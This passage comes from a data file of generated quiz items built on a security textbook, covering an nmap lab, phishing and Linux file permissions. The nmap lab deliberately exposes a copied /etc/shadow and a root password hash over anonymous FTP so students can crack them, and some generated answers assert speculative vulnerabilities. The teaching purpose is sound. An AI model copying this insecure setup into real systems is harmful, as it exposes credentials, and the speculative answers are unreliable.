eth0\n\n       valid_lft forever preferred_lft forever</code></pre>\n\n</figure>\n\nWe care about the `eth0`{.literal} device, so as you can see on my machine the address is `172.20.0.2`{.literal}. We\n\nwill use nmap's ping scan to search for any device within the last 8 bits of our IP address (`/24`{.literal}). You may\n\nnotice that we are actually on a `/16`{.literal} subnet, but by limiting ourselves to `/24`{.literal} the scan will go\n\n*much* faster.\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap -sP 172.20.0.0/24\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:25 UTC\n\nNmap scan report for 172.20.0.1\n\nHost is up (0.000076s latency).\n\nMAC Address: 02:42:A6:CA:0D:77 (Unknown)\n\nNmap scan report for nmap_victim_1.nmap_default (172.20.0.3)\n\nHost is up (0.000070s latency).\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNmap scan report for 7b6d733cc03a (172.20.0.2)\n\nHost is up.\n\nNmap done: 256 IP addresses (3 hosts up) scanned in 5.78 seconds</code></pre>\n\n</figure>\n\nIn this instance we found three other machines on the network. One of which is conveniently named victim.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\n[Read the nmap documentation for host discovery.](https://nmap.org/book/man-host-discovery.html){.link} What other types\n\nof scans could you use if a host does not respond to an ICMP ping packet?\n\n:::\n\n</aside>\n\nNow lets do a full scan on on the victim machine. Docker Compose does a nice job of resolving DNS requests for sensible\n\nnames in the `docker-compose.yml`{.literal} file so we can refer to the host we want to scan as `victim`{.literal}.\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap victim\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:37 UTC\n\nNmap scan report for victim (172.20.0.3)\n\nHost is up (0.000018s latency).\n\nrDNS record for 172.20.0.3: nmap_victim_1.nmap_default\n\nNot shown: 999 closed ports\n\nPORT   STATE SERVICE\n\n21/tcp open  ftp\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 1.84 seconds</code></pre>\n\n</figure>\n\nBy default, nmap uses a [SYN](https://www.techtarget.com/searchnetworking/definition/SYN-scanning){.link} scan against\n\nwell known ports. This type of scan is harder to detect (as it does not fully open a connection) and can be run quickly.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat ports are open on the victim machine? Why is *this* particular protocol insecure?\n\n:::\n\n</aside>\n\nnmap is capable of much more than just simple port scanning. nmap includes version detection and OS fingerprinting\n\n(among other things). To get a much better picture of what exactly `victim`{.literal} is running, you can use the\n\n`-A`{.literal} option:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap -A victim\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:44 UTC\n\nNmap scan report for victim (172.20.0.3)\n\nHost is up (0.000096s latency).\n\nrDNS record for 172.20.0.3: nmap_victim_1.nmap_default\n\nNot shown: 999 closed ports\n\nPORT   STATE SERVICE VERSION\n\n21/tcp open  ftp     ProFTPD\n\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n\n|_drwxr-xr-x   1 ftp      users        4096 Sep 22 20:11 incoming\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\n\nTCP/IP fingerprint:\n\nOS:SCAN(V=7.70%E=4%D=9/22%OT=21%CT=1%CU=44136%PV=Y%DS=1%DC=D%G=Y%M=0242AC%T\n\nOS:M=614B95AE%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%TS=A\n\nOS:)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B\n\nOS:4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88\n\nOS:)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+\n\nOS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)\n\nOS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A\n\nOS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D\n\nOS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4\n\nOS:0%CD=S)\n\nNetwork Distance: 1 hop\n\nTRACEROUTE\n\nHOP RTT     ADDRESS\n\n1   0.10 ms nmap_victim_1.nmap_default (172.20.0.3)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n\nNmap done: 1 IP address (1 host up) scanned in 28.39 seconds</code></pre>\n\n</figure>\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat additional information did you learn from the `-A`{.literal} option? How do you think this could be exploited?\n\n:::\n\n</aside>\n\nNow, using the `scanner`{.literal} container you are currently on see what you can find out about `victim`{.literal}.\n\n[This man page may be of some help.](https://linux.die.net/man/1/ftp){.link}\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nBONUS: Remembering what you learned in the *Hash it Out* lab, what is the root password on the victim machine?\n\n:::\n\n</aside>\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nBONUS: How can you test to see if you got it right? What does this say about how ProFTP is configured on\n\n`victim`{.literal}?\n\n:::\n\n</aside>\n\nWhen you are all done poking around, you can exit the shell and run `docker-compose down`{.literal} to stop\n\n`victim`{.literal} from running in the background.\n\n:::::::::\n\n:::: {.section .sect2 title=\"4.6. Review Questions\"}\n", "topic": "Understanding the importance of using appropriate security tools and techniques for network security assessments.", "question": "Considering the nmap scan results presented, specifically the identified open port (21/tcp \u2013 FTP) and the detected ProFTPD version, outline three potential vulnerabilities associated with this configuration and explain how nmap's `-A` option contributed to their identification.", "answer": "1. Command Injection: ProFTPD vulnerabilities can allow attackers to inject commands into the server, potentially leading to remote code execution. 2. Versioned Vulnerabilities: The identified ProFTPD version likely has known vulnerabilities that can be exploited. 3. Directory Traversal: The \u2018incoming\u2019 directory suggests a potential for directory traversal attacks if not properly secured, allowing attackers to access files outside the intended directory.", "explanation": "The open FTP port on the victim machine is a significant vulnerability. ProFTPD, particularly older versions, is known to have vulnerabilities exploitable via command injection, buffer overflows, and weak authentication. The `-A` option of nmap revealed the ProFTPD version, allowing for targeted research into known vulnerabilities specific to that version.  Furthermore, it detected the presence of the \u2018incoming\u2019 directory, suggesting a potential path traversal vulnerability if not properly secured.", "question_token_count": 51, "answer_correctness_score": 9, "explanation_validity_score": 9, "question_clarity_score": 8, "question_groundedness_score": 9, "avg_answer_token_count": 85, "choices": null}
{"context": "## 4.5. Lab: Scanning with nmap {#_computer_systems_security_planning_for_success.xhtml__lab_scanning_with_nmap}\nFor this lab we will start by downloading and extracting the files required. Download\n\n[nmap.zip](https://github.com/rxt1077/it230/raw/main/labs/nmap.zip){.link} and extract it to a directory you can access\n\nfrom the shell. Open a shell in that directory (it should have a `docker-compose.yml`{.literal} in it and a\n\n`victim`{.literal} and `scanner`{.literal} directory). Since we will be simulating multiple machines in this lab, we\n\nwill make use of Docker Compose which was already installed with Docker. Docker Compose reads a\n\n`docker-compose.yml`{.literal} file which should already be in your `nmap`{.literal} directory. Run\n\n`docker-compose up --build --detach`{.literal} to build and run the images in the background:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\temp\\nmap&gt; docker-compose up --build --detach\n\nBuilding victim\n\n[+] Building 2.9s (15/15) FINISHED\n\n =&gt; [internal] load build definition from Dockerfile                                                                                                   0.1s\n\n =&gt; =&gt; transferring dockerfile: 518B                                                                                                                   0.0s\n\n =&gt; [internal] load .dockerignore                                                                                                                      0.1s\n\n =&gt; =&gt; transferring context: 2B                                                                                                                        0.0s\n\n =&gt; [internal] load metadata for docker.io/library/debian:latest                                                                                       0.0s\n\n =&gt; [ 1/10] FROM docker.io/library/debian                                                                                                              0.0s\n\n =&gt; [internal] load build context                                                                                                                      0.0s\n\n =&gt; =&gt; transferring context: 640B                                                                                                                      0.0s\n\n =&gt; CACHED [ 2/10] RUN apt-get -y update                                                                                                               0.0s\n\n =&gt; CACHED [ 3/10] RUN apt-get -y install proftpd-basic                                                                                                0.0s\n\n =&gt; CACHED [ 4/10] RUN sed -i &quot;1s/.*/root:$6$.DEC7ti\\/4959zEK9$H7BPwBTz6tISYG8oZuhXLS5L3ZPYwdzzQNQTg8m4Ql3ebX9U\\/afVhi4OSpK3mNTSpT8DefJ2USdWuT5DHOkRY  0.0s\n\n =&gt; [ 5/10] RUN sed -i &quot;/^root/d&quot; /etc/ftpusers                                                                                                        0.4s\n\n =&gt; [ 6/10] COPY bad.conf /etc/proftpd/conf.d/                                                                                                         0.0s\n\n =&gt; [ 7/10] RUN chsh -s /bin/bash ftp                                                                                                                  0.6s\n\n =&gt; [ 8/10] RUN mkdir -p /home/ftp/incoming                                                                                                            0.5s\n\n =&gt; [ 9/10] RUN cp /etc/shadow /home/ftp/incoming/shadow.backup                                                                                        0.6s\n\n =&gt; [10/10] RUN chown -R ftp.users /home/ftp                                                                                                           0.5s\n\n =&gt; exporting to image                                                                                                                                 0.2s\n\n =&gt; =&gt; exporting layers                                                                                                                                0.2s\n\n =&gt; =&gt; writing image sha256:dc9af53b250b4f7fcfbe5a6668a540bd02ebef0353c5927ed4591a512363e831                                                           0.0s\n\n =&gt; =&gt; naming to docker.io/library/nmap_victim                                                                                                         0.0s\n\nUse &#39;docker scan&#39; to run Snyk tests against images to find vulnerabilities and learn how to fix them\n\nBuilding scanner\n\n[+] Building 0.1s (7/7) FINISHED\n\n =&gt; [internal] load build definition from Dockerfile                                                                                                   0.0s\n\n =&gt; =&gt; transferring dockerfile: 111B                                                                                                                   0.0s\n\n =&gt; [internal] load .dockerignore                                                                                                                      0.0s\n\n =&gt; =&gt; transferring context: 2B                                                                                                                        0.0s\n\n =&gt; [internal] load metadata for docker.io/library/debian:latest                                                                                       0.0s\n\n =&gt; [1/3] FROM docker.io/library/debian                                                                                                                0.0s\n\n =&gt; CACHED [2/3] RUN apt-get -y update                                                                                                                 0.0s\n\n =&gt; CACHED [3/3] RUN apt-get -y install nmap ftp john                                                                                                  0.0s\n\n =&gt; exporting to image                                                                                                                                 0.0s\n\n =&gt; =&gt; exporting layers                                                                                                                                0.0s\n\n =&gt; =&gt; writing image sha256:14ba503b7925089023184d783c53c22c4167fdf2338df0e85143daedf8b458ac                                                           0.0s\n\n =&gt; =&gt; naming to docker.io/library/nmap_scanner                                                                                                        0.0s\n\nUse &#39;docker scan&#39; to run Snyk tests against images to find vulnerabilities and learn how to fix them\n\nStarting nmap_scanner_1  ... done\n\nRecreating nmap_victim_1 ... done</code></pre>\n\n</figure>\n\nNow we actually have two containers running, one named `victim`{.literal} which is our target machine and another named\n\n`scanner`{.literal} which we will use to learn about nmap. Lets start a BASH shell on `scanner`{.literal} and work from\n\nthere:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\temp\\nmap&gt; docker-compose run scanner bash\n\nCreating nmap_scanner_run ... done\n\nroot@7b6d733cc03a:/\u2460</code></pre>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* Notice the prompt change. We are now *inside* the `scanner`{.literal} container running BASH.\n\n:::\n\nLets use the Linux `ip addr`{.literal} command to see what our IP address on this network is:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# ip addr\n\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n\n    inet 127.0.0.1/8 scope host lo\n\n       valid_lft forever preferred_lft forever\n\n2: tunl0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000\n\n    link/ipip 0.0.0.0 brd 0.0.0.0\n\n3: sit0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000\n\n    link/sit 0.0.0.0 brd 0.0.0.0\n\n165: eth0@if166: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default\n\n    link/ether 02:42:ac:14:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n\n    inet 172.20.0.2/16 brd 172.20.255.255 scope global eth0\n\n       valid_lft forever preferred_lft forever</code></pre>\n\n</figure>\n\nWe care about the `eth0`{.literal} device, so as you can see on my machine the address is `172.20.0.2`{.literal}. We\n\nwill use nmap's ping scan to search for any device within the last 8 bits of our IP address (`/24`{.literal}). You may\n\nnotice that we are actually on a `/16`{.literal} subnet, but by limiting ourselves to `/24`{.literal} the scan will go\n\n*much* faster.\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap -sP 172.20.0.0/24\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:25 UTC\n\nNmap scan report for 172.20.0.1\n\nHost is up (0.000076s latency).\n\nMAC Address: 02:42:A6:CA:0D:77 (Unknown)\n\nNmap scan report for nmap_victim_1.nmap_default (172.20.0.3)\n\nHost is up (0.000070s latency).\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNmap scan report for 7b6d733cc03a (172.20.0.2)\n\nHost is up.\n\nNmap done: 256 IP addresses (3 hosts up) scanned in 5.78 seconds</code></pre>\n\n</figure>\n\nIn this instance we found three other machines on the network. One of which is conveniently named victim.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\n[Read the nmap documentation for host discovery.](https://nmap.org/book/man-host-discovery.html){.link} What other types\n\nof scans could you use if a host does not respond to an ICMP ping packet?\n\n:::\n\n</aside>\n\nNow lets do a full scan on on the victim machine. Docker Compose does a nice job of resolving DNS requests for sensible\n\nnames in the `docker-compose.yml`{.literal} file so we can refer to the host we want to scan as `victim`{.literal}.\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap victim\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:37 UTC\n\nNmap scan report for victim (172.20.0.3)\n\nHost is up (0.000018s latency).\n\nrDNS record for 172.20.0.3: nmap_victim_1.nmap_default\n\nNot shown: 999 closed ports\n\nPORT   STATE SERVICE\n\n21/tcp open  ftp\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 1.84 seconds</code></pre>\n\n</figure>\n\nBy default, nmap uses a [SYN](https://www.techtarget.com/searchnetworking/definition/SYN-scanning){.link} scan against\n\nwell known ports. This type of scan is harder to detect (as it does not fully open a connection) and can be run quickly.\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat ports are open on the victim machine? Why is *this* particular protocol insecure?\n\n:::\n\n</aside>\n\nnmap is capable of much more than just simple port scanning. nmap includes version detection and OS fingerprinting\n\n(among other things). To get a much better picture of what exactly `victim`{.literal} is running, you can use the\n\n`-A`{.literal} option:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@7b6d733cc03a:/# nmap -A victim\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-22 20:44 UTC\n\nNmap scan report for victim (172.20.0.3)\n\nHost is up (0.000096s latency).\n\nrDNS record for 172.20.0.3: nmap_victim_1.nmap_default\n\nNot shown: 999 closed ports\n\nPORT   STATE SERVICE VERSION\n\n21/tcp open  ftp     ProFTPD\n\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n\n|_drwxr-xr-x   1 ftp      users        4096 Sep 22 20:11 incoming\n\nMAC Address: 02:42:AC:14:00:03 (Unknown)\n\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\n\nTCP/IP fingerprint:\n\nOS:SCAN(V=7.70%E=4%D=9/22%OT=21%CT=1%CU=44136%PV=Y%DS=1%DC=D%G=Y%M=0242AC%T\n\nOS:M=614B95AE%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%TS=A\n\nOS:)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B\n\nOS:4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88\n\nOS:)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+\n\nOS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)\n\nOS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A\n\nOS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D\n\nOS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4\n\nOS:0%CD=S)\n\nNetwork Distance: 1 hop\n\nTRACEROUTE\n\nHOP RTT     ADDRESS\n\n1   0.10 ms nmap_victim_1.nmap_default (172.20.0.3)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n\nNmap done: 1 IP address (1 host up) scanned in 28.39 seconds</code></pre>\n\n</figure>\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nWhat additional information did you learn from the `-A`{.literal} option? How do you think this could be exploited?\n\n:::\n\n</aside>\n\nNow, using the `scanner`{.literal} container you are currently on see what you can find out about `victim`{.literal}.\n\n[This man page may be of some help.](https://linux.die.net/man/1/ftp){.link}\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nBONUS: Remembering what you learned in the *Hash it Out* lab, what is the root password on the victim machine?\n\n:::\n\n</aside>\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nBONUS: How can you test to see if you got it right? What does this say about how ProFTP is configured on\n\n`victim`{.literal}?\n\n:::\n\n</aside>\n\nWhen you are all done poking around, you can exit the shell and run `docker-compose down`{.literal} to stop\n\n`victim`{.literal} from running in the background.\n\n:::::::::\n\n:::: {.section .sect2 title=\"4.6. Review Questions\"}\n", "topic": "Understanding the potential impact of network vulnerabilities on system security.", "question": "Considering the nmap scan results, specifically the open FTP port and the potentially weak password configuration on the `victim` machine, what are three specific, realistic attack vectors an attacker could leverage to compromise this system?", "answer": "Brute-force the root password, exploit FTP vulnerabilities, or upload malicious files via the \u2018incoming\u2019 directory.", "explanation": "The open FTP port, combined with a potentially weak root password and the presence of a \u2018incoming\u2019 directory, presents several vulnerabilities. An attacker could attempt to brute-force the root password, exploit known FTP vulnerabilities, or use the \u2018incoming\u2019 directory to upload malicious files or execute commands.", "question_token_count": 44, "answer_correctness_score": 9, "explanation_validity_score": 9, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 23, "choices": null}
{"context": "## 3.5. Delivery of Malware {#_computer_systems_security_planning_for_success.xhtml__delivery_of_malware}\nMalware is often delivered through social engineering, namely convincing an actor within an organization to download and\n\nrun or click on something. It can also delivered through infiltrating the software packages something depends on, supply\n\nchain, or possibly through a software exploit on an publicly exposed service. Some of the most common ways of spreading\n\nmalware are detailed below.\n\n:::: {.section .sect3 title=\"3.5.1. Phishing\"}\n\n\n### 3.5.1. Phishing {#_computer_systems_security_planning_for_success.xhtml__phishing}\nPhishing involves communicating with someone via a fraudulent message in an effort to make them perform and action that\n\nwill harm them. It is broken into five main categories:\n\n::: description-list\n\n[Spear phishing]{.term}\n\n:   [Sending phishing emails or other communications that are targeted towards a particular business or environment.\n\n    These messages may include information about the inner workings of the organization in an attempt to prove their\n\n    validity. They may also take advantage of a known, insecure practice at a particular organization. Spear phishing is\n\n    not your standard wide-net phishing attempt, but more of a focused, tailored, custom campaign.]{.principal}\n\n[Whaling]{.term}\n\n:   [Targeting high-ranking individuals at an organization. Whaling is often used in conjunction with spear\n\n    phishing.]{.principal}\n\n[Smishing]{.term}\n\n:   [Using SMS messages when phishing.]{.principal}\n\n[Vishing]{.term}\n\n:   [Using voice messages when phishing.]{.principal}\n\n[Phishing sites]{.term}\n\n:   [Threat actors can attempt to gain unauthorized access through information obtained from non-business related\n\n    communication channel. For example, malicious actors may know that the CEO frequents a popular sailing forum. These\n\n    actors could set up an account on the sailing forum to direct message the CEO for information.]{.principal}\n\n:::\n\n::::\n\n::: {.section .sect3 title=\"3.5.2. SPAM\"}\n", "topic": "What distinguishes spear phishing from standard phishing campaigns, and why is this distinction important for security planning?", "question": "What is the key characteristic that distinguishes spear phishing from more general phishing techniques, and how does this difference impact an organization\u2019s security planning strategy?", "answer": "Targeted use of organizational knowledge.", "explanation": "Spear phishing relies on exploiting specific knowledge about a target organization, unlike broader phishing campaigns that typically employ generic messages. This targeted approach dramatically increases the likelihood of success, necessitating a heightened focus on identifying and mitigating these specific vulnerabilities.", "question_token_count": 29, "answer_correctness_score": 9, "explanation_validity_score": 10, "question_clarity_score": 7, "question_groundedness_score": 10, "avg_answer_token_count": 8, "choices": null}
{"context": "### 7.3.11. Tokenization {#_computer_systems_security_planning_for_success.xhtml__tokenization}\nTokenization may be used as part of an access control scheme to protect sensitive information. Information that would be\n\nhighly valuable if compromised is replaced with a random token known to the parties involved in the transaction. In a\n\ntypically scenario once the tokens have been established, only the token is sent out over an untrusted network.\n\nImagine you don't want your credit card number exposed to merchants. One solution would be if you used a payment service\n\nthat issued you a new credit card number for each transaction. This credit card number would only be valid for a single\n\ntransaction and would be billed to your regular credit card (which the payment service would have access to). In this\n\ncase the token is the one-time-use credit card number and the sensitive information is your actual credit card number.\n\nPayment services like ApplePay and GoogleWallet do exactly this.\n\n:::\n\n:::::::::::::::::\n\n::::::: {.section .sect2 title=\"7.4. Lab: Linux File Permissions\"}\n\n\n## 7.4. Lab: Linux File Permissions {#_computer_systems_security_planning_for_success.xhtml__lab_linux_file_permissions}\nIn this lab we are going to explore UNIX style file permissions and determine what they can do and why they are limited.\n\nFinally we will see how Linux ACLs provide more flexibility in assigning permissions.\n\nWe will be working in a vanilla Ubuntu container and installing software and adding users manually. Let's start up the\n\ncontainer, install the packages we need, and add some users to work with:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>C:\\Users\\rxt1077\\it230\\docs&gt;docker run -it ubuntu bash\n\nroot@11ce9e5ee80e:/# apt-get update\n\n&lt;snip&gt;\n\nroot@11ce9e5ee80e:/# apt-get install acl\n\nReading package lists... Done\n\nBuilding dependency tree\n\nReading state information... Done\n\nThe following NEW packages will be installed:\n\n  acl\n\n0 upgraded, 1 newly installed, 0 to remove and 4 not upgraded.\n\nNeed to get 37.8 kB of archives.\n\nAfter this operation, 197 kB of additional disk space will be used.\n\nGet:1 http://archive.ubuntu.com/ubuntu focal/main amd64 acl amd64 2.2.53-6 [37.8 kB]\n\nFetched 37.8 kB in 0s (94.1 kB/s)\n\ndebconf: delaying package configuration, since apt-utils is not installed\n\nSelecting previously unselected package acl.\n\n(Reading database ... 4127 files and directories currently installed.)\n\nPreparing to unpack .../acl_2.2.53-6_amd64.deb ...\n\nUnpacking acl (2.2.53-6) ...\n\nSetting up acl (2.2.53-6) ...\n\nroot@11ce9e5ee80e:/# useradd alice\n\nroot@11ce9e5ee80e:/# useradd bob\n\nroot@11ce9e5ee80e:/# useradd carol\n\nroot@11ce9e5ee80e:/# useradd dave</code></pre>\n\n</figure>\n\nTraditional UNIX file permissions support user and group ownership of a file. Read, write, and execute permissions for a\n\nfile can be set for the user, group, or others. You can view the permissions of a file with the `ls -l`{.literal}\n\ncommand. Let's make home directories for Alice, Bob, and Carol and view the default permissions:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@11ce9e5ee80e:/# cd home\n\nroot@11ce9e5ee80e:/home# mkdir alice bob carol\n\nroot@11ce9e5ee80e:/home# ls -l\n\ntotal 12\n\ndrwxr-xr-x 2 root root 4096 Oct 28 01:28 alice\n\ndrwxr-xr-x 2 root root 4096 Oct 28 01:28 bob\n\ndrwxr-xr-x 2 root root 4096 Oct 28 01:28 carol</code></pre>\n\n</figure>\n\nThe text `drwxr-xr-x`{.literal} tells us that these files are directories, the owner has read/write/execute permission,\n\nthe group has read/execute permission, and other users have read/execute permission. It is important to note that\n\nexecute permissions are required for viewing the contents of a directory.\n\nFiles owners and a groups are set with the `chown`{.literal} command, following the format\n\n`chown <user>.<group> <filename>`{.literal}. Let's try to use this command to make the home directories of alice, bob,\n\nand carol private:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@11ce9e5ee80e:/home# chown alice.alice alice\n\nroot@11ce9e5ee80e:/home# chown bob.bob bob\n\nroot@11ce9e5ee80e:/home# chown carol.carol carol\n\nroot@11ce9e5ee80e:/home# ls -l\n\ntotal 12\n\ndrwxr-xr-x 2 alice alice 4096 Oct 28 01:28 alice\n\ndrwxr-xr-x 2 bob   bob   4096 Oct 28 01:28 bob\n\ndrwxr-xr-x 2 carol carol 4096 Oct 28 01:28 carol</code></pre>\n\n</figure>\n\nWhen a user is added to a UNIX system with the `useradd`{.literal} command a group with their name is created. This\n\nallows us to pass a group to `chown`{.literal} that only they will have access to. While this is a good start, others\n\nstill have the ability to read and execute these directories, meaning *anyone* can view the contents. To prove this,\n\nlets assume the role of dave and try doing an `ls`{.literal} on each of the directories:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@11ce9e5ee80e:/home# su dave \u2460\n\n$ ls alice\n\n$ ls bob\n\n$ ls carol\n\n$ exit</code></pre>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* `su`{.literal} allows us to assume the role of anyone, often it is used to assume the role of the *superuser*\n\n:::\n\nThe `ls`{.literal} command was successful even though there were no files to look at. If we weren't able to view the\n\ncontents, we would have received a permission denied error. The `chmod`{.literal} command is used to modify file\n\npermissions for a User (`u`{.literal}), Group (`g`{.literal}), Others (`o`{.literal}), or All (`a`{.literal}).\n\n`chmod`{.literal} can remove a permission with `-`{.literal}, add a permission with `+`{.literal}, or set a permission\n\n(removing others) with `=`{.literal}. Let's use `chmod`{.literal} to actually make these home directories private:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@11ce9e5ee80e:/home# chmod u=rwx,g=,o= alice\n\nroot@11ce9e5ee80e:/home# chmod u=rwx,g=,o= bob\n\nroot@11ce9e5ee80e:/home# chmod u=rwx,g=,o= carol\n\nroot@11ce9e5ee80e:/home# ls -l\n\ntotal 12\n\ndrwx------ 2 alice alice 4096 Oct 28 01:28 alice\n\ndrwx------ 2 bob   bob   4096 Oct 28 01:28 bob\n\ndrwx------ 2 carol carol 4096 Oct 28 01:28 carol</code></pre>\n\n</figure>\n\nThings look much better, but let's test it and see if Dave can view any of the directories:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@11ce9e5ee80e:/home# su dave\n\n$ ls alice\n\nls: cannot open directory &#39;alice&#39;: Permission denied\n\n$ ls bob\n\nls: cannot open directory &#39;bob&#39;: Permission denied\n\n$ ls carol\n\nls: cannot open directory &#39;carol&#39;: Permission denied\n\n$ exit</code></pre>\n\n</figure>\n\nLastly, lets make sure that Alice can view the contents of her home directory:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@11ce9e5ee80e:/home# su alice\n\n$ ls alice\n\n$ exit</code></pre>\n\n</figure>\n\nLooks good!\n\n<aside class=\"admonition important deliverable\" title=\"Important\" epub:type=\"notice\">\n\n::: content\n\nUsing your first name (all lowercase) add yourself as a user and create a home directory for yourself. Set the\n\npermissions such that only you can view the contents. Show the permissions of the home directory and demonstrate that\n\nanother user *cannot* view its contents. Take a screenshot showing all of this and submit this as one of your\n\ndeliverables.\n\n:::\n\n</aside>\n\nUnfortunately traditional UNIX file permissions often do not provide the granularity needed in a modern system. For\n\nexample, lets assume that we wanted a web server to be able to view the contents of Alice, Bob, and Carol's home\n\ndirectories. This is typically done to allow users to place a `public_html`{.literal} directory in their home directory\n\nand set up a personal web space. We could do this by making their home directories viewable by others, but then we have\n\nthe same issue we started with. We could also do this by changing the group ownership of their home directories to a\n\ngroup that the web server is part of, but then we open up the home directories to any other users or services that are\n\npart of that group.\n\nThe solution to this problem is to use Linux ACLs, which allow you to fine tune permissions. Two commands,\n\n`setfacl`{.literal} and `getfacl`{.literal} are used to adjust Linux ACLs. As an example let's add an http user, use the\n\n`setfacl`{.literal} command to explicitly give the http user read and execute permissions to all three directories, list\n\nthe new permissions, and list the new ACLs:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@11ce9e5ee80e:/home# useradd http\n\nroot@11ce9e5ee80e:/home# setfacl -m u:http:rx alice bob carol\n\nroot@11ce9e5ee80e:/home# ls 